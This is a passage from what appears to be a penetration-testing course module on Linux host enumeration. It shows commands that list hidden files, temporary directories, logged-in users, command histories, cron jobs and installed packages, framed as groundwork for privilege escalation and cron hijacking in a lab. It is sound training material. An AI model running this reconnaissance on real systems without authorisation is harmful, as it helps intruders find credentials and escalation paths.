udev            <span class="hljs-number">1</span>,<span class="hljs-number">9</span>G     <span class="hljs-number">0</span>  <span class="hljs-number">1</span>,<span class="hljs-number">9</span>G   <span class="hljs-number">0</span>% /dev
tmpfs           <span class="hljs-number">389</span>M  <span class="hljs-number">1</span>,<span class="hljs-number">8</span>M  <span class="hljs-number">388</span>M   <span class="hljs-number">1</span>% /run
/dev/sda5        <span class="hljs-number">20</span>G  <span class="hljs-number">7</span>,<span class="hljs-number">9</span>G   <span class="hljs-number">11</span>G  <span class="hljs-number">44</span>% /
tmpfs           <span class="hljs-number">1</span>,<span class="hljs-number">9</span>G     <span class="hljs-number">0</span>  <span class="hljs-number">1</span>,<span class="hljs-number">9</span>G   <span class="hljs-number">0</span>% /dev/shm
tmpfs           <span class="hljs-number">5</span>,<span class="hljs-number">0</span>M  <span class="hljs-number">4</span>,<span class="hljs-number">0</span>K  <span class="hljs-number">5</span>,<span class="hljs-number">0</span>M   <span class="hljs-number">1</span>% /run/lock
tmpfs           <span class="hljs-number">1</span>,<span class="hljs-number">9</span>G     <span class="hljs-number">0</span>  <span class="hljs-number">1</span>,<span class="hljs-number">9</span>G   <span class="hljs-number">0</span>% /sys/fs/cgroup
/dev/loop0      <span class="hljs-number">128</span>K  <span class="hljs-number">128</span>K     <span class="hljs-number">0</span> <span class="hljs-number">100</span>% /snap/bare/<span class="hljs-number">5</span>
/dev/loop1       <span class="hljs-number">62</span>M   <span class="hljs-number">62</span>M     <span class="hljs-number">0</span> <span class="hljs-number">100</span>% /snap/core20/<span class="hljs-number">1611</span>
/dev/loop2       <span class="hljs-number">92</span>M   <span class="hljs-number">92</span>M     <span class="hljs-number">0</span> <span class="hljs-number">100</span>% /snap/gtk-common-themes/<span class="hljs-number">1535</span>
/dev/loop4       <span class="hljs-number">55</span>M   <span class="hljs-number">55</span>M     <span class="hljs-number">0</span> <span class="hljs-number">100</span>% /snap/snap-store/<span class="hljs-number">558</span>
/dev/loop3      <span class="hljs-number">347</span>M  <span class="hljs-number">347</span>M     <span class="hljs-number">0</span> <span class="hljs-number">100</span>% /snap/gnome<span class="hljs-number">-3</span><span class="hljs-number">-38</span><span class="hljs-number">-2004</span>/<span class="hljs-number">115</span>
/dev/loop5       <span class="hljs-number">47</span>M   <span class="hljs-number">47</span>M     <span class="hljs-number">0</span> <span class="hljs-number">100</span>% /snap/snapd/<span class="hljs-number">16292</span>
/dev/sda1       <span class="hljs-number">511</span>M  <span class="hljs-number">4</span>,<span class="hljs-number">0</span>K  <span class="hljs-number">511</span>M   <span class="hljs-number">1</span>% /boot/efi
tmpfs           <span class="hljs-number">389</span>M   <span class="hljs-number">24</span>K  <span class="hljs-number">389</span>M   <span class="hljs-number">1</span>% /run/user/<span class="hljs-number">1000</span>
/dev/sr0        <span class="hljs-number">3</span>,<span class="hljs-number">6</span>G  <span class="hljs-number">3</span>,<span class="hljs-number">6</span>G     <span class="hljs-number">0</span> <span class="hljs-number">100</span>% /media/htb-student/Ubuntu <span class="hljs-number">20.04</span><span class="hljs-number">.5</span> LTS amd64
/dev/loop6       <span class="hljs-number">50</span>M   <span class="hljs-number">50</span>M     <span class="hljs-number">0</span> <span class="hljs-number">100</span>% /snap/snapd/<span class="hljs-number">17576</span>
/dev/loop7       <span class="hljs-number">64</span>M   <span class="hljs-number">64</span>M     <span class="hljs-number">0</span> <span class="hljs-number">100</span>% /snap/core20/<span class="hljs-number">1695</span>
/dev/loop8       <span class="hljs-number">46</span>M   <span class="hljs-number">46</span>M     <span class="hljs-number">0</span> <span class="hljs-number">100</span>% /snap/snap-store/<span class="hljs-number">599</span>
/dev/loop9      <span class="hljs-number">347</span>M  <span class="hljs-number">347</span>M     <span class="hljs-number">0</span> <span class="hljs-number">100</span>% /snap/gnome<span class="hljs-number">-3</span><span class="hljs-number">-38</span><span class="hljs-number">-2004</span>/<span class="hljs-number">119</span>
</code></pre>
<p>When a file system is unmounted, it is no longer accessible by the system. This can be done for various reasons, such as when a disk is removed, or a file system is no longer needed. Another reason may be that files, scripts, documents, and other important information must not be mounted and viewed by a standard user. Therefore, if we can extend our privileges to the <code>root</code> user, we could mount and read these file systems ourselves. Unmounted file systems can be viewed as follows:</p>
<p><strong>Unmounted File Systems</strong></p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/fstab | grep -v <span class="hljs-string">"#"</span> | column -t

UUID=<span class="hljs-number">5</span>bf16727-fcdf<span class="hljs-number">-4205</span><span class="hljs-number">-906</span>c<span class="hljs-number">-0620</span>aa4a058f  /          ext4  errors=remount-ro  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>
UUID=BE56-AAE0                             /boot/efi  vfat  umask=<span class="hljs-number">0077</span>         <span class="hljs-number">0</span>  <span class="hljs-number">1</span>
/swapfile                                  none       swap  sw                 <span class="hljs-number">0</span>  <span class="hljs-number">0</span>
</code></pre>
<p>Many folders and files are kept hidden on a Linux system so they are not obvious, and accidental editing is prevented. Why such files and folders are kept hidden, there are many more reasons than those mentioned so far. Nevertheless, we need to be able to locate all hidden files and folders because they can often contain sensitive information, even if we have read-only permissions.</p>
<p><strong>All Hidden Files</strong></p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ find / -type f -name ".*" -exec ls -l {} \; 2&gt;/dev/null | grep htb-student

-rw-r--r--<span class="hljs-number"> 1 </span>htb-student htb-student<span class="hljs-number"> 3771 </span>Nov<span class="hljs-number"> 27 </span>11:16 /home/htb-student/.bashrc
-rw-rw-r--<span class="hljs-number"> 1 </span>htb-student htb-student<span class="hljs-number"> 180 </span>Nov<span class="hljs-number"> 27 </span>11:36 /home/htb-student/.wget-hsts
-rw-------<span class="hljs-number"> 1 </span>htb-student htb-student<span class="hljs-number"> 387 </span>Nov<span class="hljs-number"> 27 </span>14:02 /home/htb-student/.bash_history
-rw-r--r--<span class="hljs-number"> 1 </span>htb-student htb-student<span class="hljs-number"> 807 </span>Nov<span class="hljs-number"> 27 </span>11:16 /home/htb-student/.profile
-rw-r--r--<span class="hljs-number"> 1 </span>htb-student htb-student<span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 27 </span>11:31 /home/htb-student/.sudo_as_admin_successful
-rw-r--r--<span class="hljs-number"> 1 </span>htb-student htb-student<span class="hljs-number"> 220 </span>Nov<span class="hljs-number"> 27 </span>11:16 /home/htb-student/.bash_logout
-rw-rw-r--<span class="hljs-number"> 1 </span>htb-student htb-student<span class="hljs-number"> 162 </span>Nov<span class="hljs-number"> 28 </span>13:26 /home/htb-student/.notes
</code></pre>
<p><strong>All Hidden Directories</strong></p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ find / -type d -name ".*" -ls 2&gt;/dev/null

  <span class="hljs-number"> 684822 </span>    <span class="hljs-number"> 4 </span>drwx------  <span class="hljs-number"> 3 </span>htb-student htb-student    <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:32 /home/htb-student/.gnupg
  <span class="hljs-number"> 790793 </span>    <span class="hljs-number"> 4 </span>drwx------  <span class="hljs-number"> 2 </span>htb-student htb-student    <span class="hljs-number"> 4096 </span>Okt<span class="hljs-number"> 27 </span>11:31 /home/htb-student/.ssh
  <span class="hljs-number"> 684804 </span>    <span class="hljs-number"> 4 </span>drwx------ <span class="hljs-number"> 10 </span>htb-student htb-student    <span class="hljs-number"> 4096 </span>Okt<span class="hljs-number"> 27 </span>11:30 /home/htb-student/.cache
  <span class="hljs-number"> 790827 </span>    <span class="hljs-number"> 4 </span>drwxrwxr-x  <span class="hljs-number"> 8 </span>htb-student htb-student    <span class="hljs-number"> 4096 </span>Okt<span class="hljs-number"> 27 </span>11:32 /home/htb-student/CVE-2021-3156/.git
  <span class="hljs-number"> 684796 </span>    <span class="hljs-number"> 4 </span>drwx------ <span class="hljs-number"> 10 </span>htb-student htb-student    <span class="hljs-number"> 4096 </span>Okt<span class="hljs-number"> 27 </span>11:30 /home/htb-student/.config
  <span class="hljs-number"> 655426 </span>    <span class="hljs-number"> 4 </span>drwxr-xr-x  <span class="hljs-number"> 3 </span>htb-student htb-student    <span class="hljs-number"> 4096 </span>Okt<span class="hljs-number"> 27 </span>11:19 /home/htb-student/.local
  <span class="hljs-number"> 524808 </span>    <span class="hljs-number"> 4 </span>drwxr-xr-x  <span class="hljs-number"> 7 </span>gdm         gdm            <span class="hljs-number"> 4096 </span>Okt<span class="hljs-number"> 27 </span>11:19 /var/lib/gdm3/.cache
  <span class="hljs-number"> 544027 </span>    <span class="hljs-number"> 4 </span>drwxr-xr-x  <span class="hljs-number"> 7 </span>gdm         gdm            <span class="hljs-number"> 4096 </span>Okt<span class="hljs-number"> 27 </span>11:19 /var/lib/gdm3/.config
  <span class="hljs-number"> 544028 </span>    <span class="hljs-number"> 4 </span>drwxr-xr-x  <span class="hljs-number"> 3 </span>gdm         gdm            <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 31 </span>08:54 /var/lib/gdm3/.local
  <span class="hljs-number"> 524938 </span>    <span class="hljs-number"> 4 </span>drwx------  <span class="hljs-number"> 2 </span>colord      colord         <span class="hljs-number"> 4096 </span>Okt<span class="hljs-number"> 27 </span>11:19 /var/lib/colord/.cache
    <span class="hljs-number"> 1408 </span>    <span class="hljs-number"> 2 </span>dr-xr-xr-x  <span class="hljs-number"> 1 </span>htb-student htb-student    <span class="hljs-number"> 2048 </span>Aug<span class="hljs-number"> 31 </span>09:17 /media/htb-student/Ubuntu\ 20.04.5\ LTS\ amd64/.disk
  <span class="hljs-number"> 280101 </span>    <span class="hljs-number"> 4 </span>drwxrwxrwt  <span class="hljs-number"> 2 </span>root        root           <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:31 /tmp/.font-unix
  <span class="hljs-number"> 262364 </span>    <span class="hljs-number"> 4 </span>drwxrwxrwt  <span class="hljs-number"> 2 </span>root        root           <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:32 /tmp/.ICE-unix
  <span class="hljs-number"> 262362 </span>    <span class="hljs-number"> 4 </span>drwxrwxrwt  <span class="hljs-number"> 2 </span>root        root           <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:32 /tmp/.X11-unix
  <span class="hljs-number"> 280103 </span>    <span class="hljs-number"> 4 </span>drwxrwxrwt  <span class="hljs-number"> 2 </span>root        root           <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:31 /tmp/.Test-unix
  <span class="hljs-number"> 262830 </span>    <span class="hljs-number"> 4 </span>drwxrwxrwt  <span class="hljs-number"> 2 </span>root        root           <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:31 /tmp/.XIM-unix
  <span class="hljs-number"> 661820 </span>    <span class="hljs-number"> 4 </span>drwxr-xr-x  <span class="hljs-number"> 5 </span>root        root           <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 31 </span>08:55 /usr/lib/modules/5.15.0-46-generic/vdso/.build-id
  <span class="hljs-number"> 666709 </span>    <span class="hljs-number"> 4 </span>drwxr-xr-x  <span class="hljs-number"> 5 </span>root        root           <span class="hljs-number"> 4096 </span>Okt<span class="hljs-number"> 27 </span>11:18 /usr/lib/modules/5.15.0-52-generic/vdso/.build-id
  <span class="hljs-number"> 657527 </span>    <span class="hljs-number"> 4 </span>drwxr-xr-x<span class="hljs-number"> 170 </span>root        root           <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 31 </span>08:55 /usr/lib/debug/.build-id
</code></pre>
<p>In addition, three default folders are intended for temporary files. These folders are visible to all users and can be read. In addition, temporary logs or script output can be found there. Both <code>/tmp</code> and <code>/var/tmp</code> are used to store data temporarily. However, the key difference is how long the data is stored in these file systems. The data retention time for <code>/var/tmp</code> is much longer than that of the <code>/tmp</code> directory. By default, all files and data stored in /var/tmp are retained for up to 30 days. In /tmp, on the other hand, the data is automatically deleted after ten days.</p>
<p>In addition, all temporary files stored in the <code>/tmp</code> directory are deleted immediately when the system is restarted. Therefore, the <code>/var/tmp</code> directory is used by programs to store data that must be kept between reboots temporarily.</p>
<p><strong>Temporary Files</strong></p>
<p>Environment Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls -l /tmp /var/tmp /dev/shm

/dev/shm:
total 0

/tmp:
total 52
-rw-------<span class="hljs-number"> 1 </span>htb-student htb-student   <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 28 </span>12:32 config-err-v8LfEU
drwx------<span class="hljs-number"> 3 </span>root        root       <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:37 snap.snap-store
drwx------<span class="hljs-number"> 2 </span>htb-student htb-student<span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:32 ssh-OKlLKjlc98xh
&lt;SNIP&gt;
drwx------<span class="hljs-number"> 2 </span>htb-student htb-student<span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:37 tracker-extract-files.1000
drwx------<span class="hljs-number"> 2 </span>gdm         gdm        <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:31 tracker-extract-files.125

/var/tmp:
total 28
drwx------<span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-colord.service-RrPcyi
drwx------<span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 28 </span>12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-ModemManager.service-4Rej9e
...SNIP...
</code></pre>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>We&#39;ve gotten an initial lay of the land and (hopefully) some sensitive or useful data points that can help us on our way to escalating privileges or even moving laterally in the internal network. Next we&#39;ll turn our focus to permissions and check to see what directories, scripts, binaries, etc we can read and write to with our current user privileges.</p>
<p>Though we are focusing on manual enumeration in this module, its worth running the <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linPEAS</a> script at this point in a real-world assessment so we have as much data to dig through as possible. Oftentimes we can find an easy win but having this output handy can sometimes uncover nuanced issues that our manual enumeration missed. We should, though, practice our manual enumeration as much as possible and create (and continue to add to) our own cheat sheet of key commands (and alternatives for different Linux operating systems). We&#39;ll start to develop our own style, command preference, and even see some areas that we can begin to script out ourselves. Tools are great and have their place but where many fall short is being able to perform a given task when a tool fails or we cannot get it onto the system.</p>
<h2 id="linux-services-internals-enumeration">Linux Services &amp; Internals Enumeration</h2>
<hr>
<p>Now that we&#39;ve dug into the environment and gotten the lay of the land and uncovered as much as possible about our user and group permissions as they relate to files, scripts, binaries, directories, etc., we&#39;ll take things one step further and look deeper into the internals of the host operating system. In this phase we will enumerate the following which will help to inform many of the attacks discussed in the later sections of this module.</p>
<ul>
<li>What services and applications are installed?</li>
<li>What services are running?</li>
<li>What sockets are in use?</li>
<li>What users, admins, and groups exist on the system?</li>
<li>Who is current logged in? What users recently logged in?</li>
<li>What password policies, if any, are enforced on the host?</li>
<li>Is the host joined to an Active Directory domain?</li>
<li>What types of interesting information can we find in history, log, and backup files</li>
<li>Which files have been modified recently and how often? Are there any interesting patterns in file modification that could indicate a cron job in use that we may be able to hijack?</li>
<li>Current IP addressing information</li>
<li>Anything interesting in the <code>/etc/hosts</code> file?</li>
<li>Are there any interesting network connections to other systems in the internal network or even outside the network?</li>
<li>What tools are installed on the system that we may be able to take advantage of? (Netcat, Perl, Python, Ruby, Nmap, tcpdump, gcc, etc.)</li>
<li>Can we access the <code>bash_history</code> file for any users and can we uncover any thing interesting from their recorded command line history such as passwords?</li>
<li>Are any Cron jobs running on the system that we may be able to hijack?</li>
</ul>
<p>At this time we&#39;ll also want to gather as much network information as possible. What is our current IP address? Does the system have any other interfaces and, hence, could possibly be used to pivot into another subnet that was previously unreachable from our attack host? We do this with the <code>ip a</code> command or <code>ifconfig</code>, but this command will sometimes not work on certain systems if the <a href="https://packages.ubuntu.com/search?keywords=net-tools">net-tools</a> package is not present.</p>
<hr>
<h3 id="internals">Internals</h3>
<p>When we talk about the <code>internals</code>, we mean the internal configuration and way of working, including integrated processes designed to accomplish specific tasks. So we start with the interfaces through which our target system can communicate.</p>
<p><strong>Network Interfaces</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ip a

<span class="hljs-number">1</span>: lo: <span class="hljs-variable">&lt;LOOPBACK,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">65536</span> qdisc noqueue <span class="hljs-keyword">state</span> UNKNOWN <span class="hljs-keyword">group</span> <span class="hljs-keyword">default</span> qlen <span class="hljs-number">1000</span>
    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>
    <span class="hljs-keyword">inet</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo
       valid_lft forever preferred_lft forever
    <span class="hljs-keyword">inet6</span> ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host 
       valid_lft forever preferred_lft forever
<span class="hljs-number">2</span>: ens192: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc mq <span class="hljs-keyword">state</span> UP <span class="hljs-keyword">group</span> <span class="hljs-keyword">default</span> qlen <span class="hljs-number">1000</span>
    link/ether <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:b9:ed:<span class="hljs-number">2</span>a brd ff:ff:ff:ff:ff:ff
    <span class="hljs-keyword">inet</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">203.168</span>/<span class="hljs-number">16</span> brd <span class="hljs-number">10.129</span>.<span class="hljs-number">255.255</span> scope <span class="hljs-keyword">global</span> dynamic ens192
       valid_lft <span class="hljs-number">3092</span>sec preferred_lft <span class="hljs-number">3092</span>sec
    <span class="hljs-keyword">inet6</span> dead:beef::<span class="hljs-number">250</span>:<span class="hljs-number">56</span>ff:feb9:ed2a/<span class="hljs-number">64</span> scope <span class="hljs-keyword">global</span> dynamic mngtmpaddr 
       valid_lft <span class="hljs-number">86400</span>sec preferred_lft <span class="hljs-number">14400</span>sec
    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">250</span>:<span class="hljs-number">56</span>ff:feb9:ed2a/<span class="hljs-number">64</span> scope link 
       valid_lft forever preferred_lft forever
</code></pre>
<p>Is there anything interesting in the <code>/etc/hosts</code> file?</p>
<p><strong>Hosts</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/hosts

<span class="hljs-number">127.0.0.1</span> localhost
<span class="hljs-number">127.0.1.1</span> nixlpe02
# The following lines are desirable for IPv6 capable hosts
<span class="hljs-number">::1</span>     ip6-localhost ip6-loopback
<span class="hljs-number">fe00::0</span> ip6-localnet
<span class="hljs-number">ff00::0</span> ip6-mcastprefix
<span class="hljs-number">ff02::1</span> ip6-allnodes
<span class="hljs-number">ff02::2</span> ip6-allrouters
</code></pre>
<p>It can also be helpful to check out each user&#39;s last login time to try to see when users typically log in to the system and how frequently. This can give us an idea of how widely used this system is which can open up the potential for more misconfigurations or &quot;messy&quot; directories or command histories.</p>
<p><strong>User&#39;s Last Login</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ lastlog

Username         Port     From             Latest
root                                       **Never logged <span class="hljs-keyword">in</span>**
daemon                                     **Never logged <span class="hljs-keyword">in</span>**
bin                                        **Never logged <span class="hljs-keyword">in</span>**
sys                                        **Never logged <span class="hljs-keyword">in</span>**
sync                                       **Never logged <span class="hljs-keyword">in</span>**
...SNIP...
systemd-coredump                           **Never logged <span class="hljs-keyword">in</span>**
mrb3n            pts/<span class="hljs-number">1</span>    <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>      Tue Aug  <span class="hljs-number">2</span> <span class="hljs-number">19</span>:<span class="hljs-number">33</span>:<span class="hljs-number">16</span> +<span class="hljs-number">0000</span> <span class="hljs-number">2022</span>
lxd                                        **Never logged <span class="hljs-keyword">in</span>**
bjones                                     **Never logged <span class="hljs-keyword">in</span>**
administrator.ilfreight                           **Never logged <span class="hljs-keyword">in</span>**
backupsvc                                  **Never logged <span class="hljs-keyword">in</span>**
cliff.moore      pts/<span class="hljs-number">0</span>    <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>        Tue Aug  <span class="hljs-number">2</span> <span class="hljs-number">19</span>:<span class="hljs-number">32</span>:<span class="hljs-number">29</span> +<span class="hljs-number">0000</span> <span class="hljs-number">2022</span>
logger                                     **Never logged <span class="hljs-keyword">in</span>**
shared                                     **Never logged <span class="hljs-keyword">in</span>**
stacey.jenkins   pts/<span class="hljs-number">0</span>    <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>      Tue Aug  <span class="hljs-number">2</span> <span class="hljs-number">18</span>:<span class="hljs-number">29</span>:<span class="hljs-number">15</span> +<span class="hljs-number">0000</span> <span class="hljs-number">2022</span>
htb-student      pts/<span class="hljs-number">0</span>    <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.15</span>      Wed Aug  <span class="hljs-number">3</span> <span class="hljs-number">13</span>:<span class="hljs-number">37</span>:<span class="hljs-number">22</span> +<span class="hljs-number">0000</span> <span class="hljs-number">2022</span>
</code></pre>
<p>In addition, let&#39;s see if anyone else is currently on the system with us. There are a few ways to do this, such as the <code>who</code> command. The <code>finger</code> command will work to display this information on some Linux systems. We can see that the <code>cliff.moore</code> user is logged in to the system with us.</p>
<p><strong>Logged In Users</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ w

 <span class="hljs-number">12</span>:<span class="hljs-number">27</span>:<span class="hljs-number">21</span> up <span class="hljs-number">1</span> day, <span class="hljs-number">16</span>:<span class="hljs-number">55</span>,  <span class="hljs-number">1</span> user,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.00</span>, <span class="hljs-number">0.00</span>
<span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
cliff.mo pts/<span class="hljs-number">0</span>    <span class="hljs-number">10.10</span>.<span class="hljs-number">14.16</span>      Tue19   <span class="hljs-number">40</span>:<span class="hljs-number">54m</span>  <span class="hljs-number">0.02s</span>  <span class="hljs-number">0.02s</span> -bash
</code></pre>
<p>It is also important to check a user&#39;s bash history, as they may be passing passwords as an argument on the command line, working with git repositories, setting up cron jobs, and more. Reviewing what the user has been doing can give you considerable insight into the type of server you land on and give a hint as to privilege escalation paths.</p>
<p><strong>Command History</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ history

    <span class="hljs-number">1</span>  id
    <span class="hljs-number">2</span>  cd /home/cliff<span class="hljs-selector-class">.moore</span>
    <span class="hljs-number">3</span>  exit
    <span class="hljs-number">4</span>  touch backup<span class="hljs-selector-class">.sh</span>
    <span class="hljs-number">5</span>  tail /var/log/apache2/error<span class="hljs-selector-class">.log</span>
    <span class="hljs-number">6</span>  ssh ec2-user@dmz02<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
    <span class="hljs-number">7</span>  history
</code></pre>
<p>Sometimes we can also find special history files created by scripts or programs. This can be found, among others, in scripts that monitor certain activities of users and check for suspicious activities.</p>
<p><strong>Finding History Files</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ find /</span> -type f <span class="hljs-string">\(</span> -name *_hist -o -name *_history <span class="hljs-string">\)</span> -exec ls -l {} <span class="hljs-string">\;</span> <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span>

-rw------- <span class="hljs-number">1</span> htb-student htb-student <span class="hljs-number">387</span> Nov <span class="hljs-number">27</span> <span class="hljs-number">14</span>:<span class="hljs-number">02</span> /home<span class="hljs-regexp">/htb-student/</span>.bash_history
</code></pre>
<p>It&#39;s also a good idea to check for any cron jobs on the system. Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.</p>
<p><strong>Cron</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls -la /etc/cron.daily/

total 48
drwxr-xr-x <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Aug <span class="hljs-number"> 2 </span>17:36 .
drwxr-xr-x<span class="hljs-number"> 96 </span>root root<span class="hljs-number"> 4096 </span>Aug <span class="hljs-number"> 2 </span>19:34 ..
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 376 </span>Dec <span class="hljs-number"> 4 </span><span class="hljs-number"> 2019 </span>apport
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1478 </span>Apr <span class="hljs-number"> 9 </span><span class="hljs-number"> 2020 </span>apt-compat
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 355 </span>Dec<span class="hljs-number"> 29 </span><span class="hljs-number"> 2017 </span>bsdmainutils
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1187 </span>Sep <span class="hljs-number"> 5 </span><span class="hljs-number"> 2019 </span>dpkg
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 377 </span>Jan<span class="hljs-number"> 21 </span><span class="hljs-number"> 2019 </span>logrotate
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1123 </span>Feb<span class="hljs-number"> 25 </span><span class="hljs-number"> 2020 </span>man-db
-rw-r--r-- <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 102 </span>Feb<span class="hljs-number"> 13 </span><span class="hljs-number"> 2020 </span>.placeholder
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4574 </span>Jul<span class="hljs-number"> 18 </span><span class="hljs-number"> 2019 </span>popularity-contest
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 214 </span>Apr <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>update-notifier-common
</code></pre>
<p>The <a href="https://man7.org/linux/man-pages/man5/proc.5.html">proc filesystem</a> (<code>proc</code> / <code>procfs</code>) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is the primary way to access process information and can be used to view and modify kernel settings. It is virtual and does not exist as a real filesystem but is dynamically generated by the kernel. It can be used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.</p>
<p><strong>Proc</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ find /</span>proc -name cmdline -exec cat {} \; <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> | tr <span class="hljs-string">" "</span> <span class="hljs-string">"\n"</span>

...SNIP...
startups<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/packagekit/</span>packagekitd<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/packagekit/</span>packagekitd<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/packagekit/</span>packagekitd<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/packagekit/</span>packagekitdroot@<span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.200</span>sshroot@<span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.200</span><span class="hljs-string">sshd:</span>
htb-student
[priv]<span class="hljs-string">sshd:</span>
htb-student
[priv]<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/ssh-agent-D-a/</span>run<span class="hljs-regexp">/user/</span><span class="hljs-number">1000</span><span class="hljs-regexp">/keyring/</span>.ssh<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/ssh-agent-D-a/</span>run<span class="hljs-regexp">/user/</span><span class="hljs-number">1000</span><span class="hljs-regexp">/keyring/</span>.<span class="hljs-string">sshsshd:</span>
htb-student<span class="hljs-meta">@pts</span>/<span class="hljs-number">2</span><span class="hljs-string">sshd:</span>
</code></pre>
<hr>
<h3 id="services">Services</h3>
<p>If it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability. However, current versions of Linux distributions can also have older packages or software installed that may have such vulnerabilities. Therefore, we will see a method to help us detect potentially dangerous packages in a bit. To do this, we first need to create a list of installed packages to work with.</p>
<p><strong>Installed Packages</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ apt list --installed | tr <span class="hljs-string">"/"</span> <span class="hljs-string">" "</span> | cut -d<span class="hljs-string">" "</span> -f1,<span class="hljs-number">3</span> | sed <span class="hljs-string">'s/[0-9]://g'</span> | tee -a installed_pkgs.list

Listing...                                                 
